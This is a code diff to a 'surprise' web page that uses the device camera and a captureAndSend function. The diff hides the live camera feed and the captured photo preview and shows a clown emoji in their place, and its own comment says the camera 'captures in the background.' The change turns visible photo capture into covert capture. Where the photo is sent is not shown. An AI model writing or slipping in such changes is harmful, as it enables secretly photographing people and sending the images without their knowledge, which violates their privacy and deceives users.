@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -193,6 +194,9 @@ button:disabled{
       <span class="heart">🎀</span>
       <span>Your surprise awaits...</span>
     </div>
+    <div id="joker" class="placeholder" hidden>
+      <span class="heart">🤡</span>
+    </div>
   </div>
 
   <div class="notice">
@@ -238,6 +242,7 @@ const $ = id => document.getElementById(id);
 const camera = $("camera");
 const preview = $("preview");
 const placeholder = $("placeholder");
+const joker = $("joker");
 const consent = $("consent");
 const startBtn = $("startBtn");
 const statusBox = $("status");
@@ -294,12 +299,12 @@ async function openCamera(){
   });
 
   camera.srcObject = stream;
-  camera.hidden = false;
+  camera.hidden = true;
 
-  // Shrink the circle only when the camera opens.
-  cameraFrame.classList.add("camera-open");
-
+  // Show only the joker in the frame while the camera captures in the background.
+  cameraFrame.classList.remove("camera-open");
   placeholder.hidden = true;
+  joker.hidden = false;
   await camera.play();
 
   const track = stream.getVideoTracks()[0];
@@ -460,9 +465,10 @@ async function captureAndSend(){
 
   previewUrl = URL.createObjectURL(photo);
   preview.src = previewUrl;
-  preview.hidden = false;
+  preview.hidden = true;
   camera.hidden = true;
   placeholder.hidden = true;
+  joker.hidden = false;
 
   stopCamera();
 
@@ -487,6 +493,7 @@ startBtn.addEventListener("click",async()=>{
     stopCamera();
     camera.hidden = true;
     placeholder.hidden = false;
+    joker.hidden = true;
 
     // Restore the original large decorative circle on failure.
     cameraFrame.classList.remove("camera-open");
